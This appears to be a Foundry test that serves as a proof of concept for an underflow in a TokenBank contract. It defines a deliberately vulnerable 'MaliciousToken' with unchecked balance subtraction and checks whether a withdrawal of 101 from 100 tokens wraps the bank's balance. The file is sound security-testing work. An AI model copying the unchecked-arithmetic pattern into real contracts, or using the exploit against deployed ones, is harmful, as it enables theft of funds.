// SPDX-License-Identifier: MIT
pragma solidity 0.8.26;
pragma experimental ABIEncoderV2;

import "forge-std/Test.sol";
import "../src/0x627fa62ccbb1c1b04ffaecd72a53e37fc0e17839.sol";

contract MaliciousToken {
    mapping(address => uint256) public balances;

    function transfer(address to, uint256 amount) external returns (bool) {
        unchecked {
            // Simulate underflow vulnerability
            balances[msg.sender] -= amount;
            balances[to] += amount;
        }
        return true;
    }

    function mint(address to, uint256 amount) external {
        balances[to] += amount;
    }
}

contract TokenBankUnderflowTest is Test {
    TokenBank public tokenBank;
    MaliciousToken public token;
    address owner = address(0x1);
    address attacker = address(0x2);

    function setUp() public {
        // Deploy contracts as owner
        vm.startPrank(owner);
        tokenBank = new TokenBank();
        token = new MaliciousToken();
        vm.stopPrank();

        // Fund tokenBank with initial tokens
        token.mint(address(tokenBank), 100);
    }

    function test_WithdrawTokenCausesUnderflow() public {
        uint256 maliciousAmount = 101;
        uint256 maxUint = type(uint256).max;

        console.log("--- BEFORE-Trigger Withdrawal ---");
        uint256 tokenBankBalanceBefore = token.balances(address(tokenBank));
        uint256 attackerBalanceBefore = token.balances(attacker);
        console.log("TokenBank token balance before:", tokenBankBalanceBefore);
        console.log("Attacker token balance before:", attackerBalanceBefore);

        console.log("--- Trigger Withdrawal ---");
        vm.prank(owner);
        tokenBank.WithdrawToken(address(token), maliciousAmount, attacker);

        console.log("--- AFTER-Trigger Withdrawal ---");
        uint256 tokenBankBalanceAfter = token.balances(address(tokenBank));
        uint256 attackerBalanceAfter = token.balances(attacker);
        console.log("TokenBank token balance after:", tokenBankBalanceAfter);
        console.log("Attacker token balance after:", attackerBalanceAfter);

        if (tokenBankBalanceAfter == maxUint && attackerBalanceAfter == 101) {
            console.log("Vulnerability Exists: Underflow in TokenBank balance occurred (changed from %s to %s) and attacker successfully received 101 tokens", tokenBankBalanceBefore, tokenBankBalanceAfter);
        } else {
            console.log("Vulnerability not Exist: TokenBank balance is %s (expected underflow to %s) or attacker received %s tokens (expected 101)", tokenBankBalanceAfter, maxUint, attackerBalanceAfter);
        }
    }
}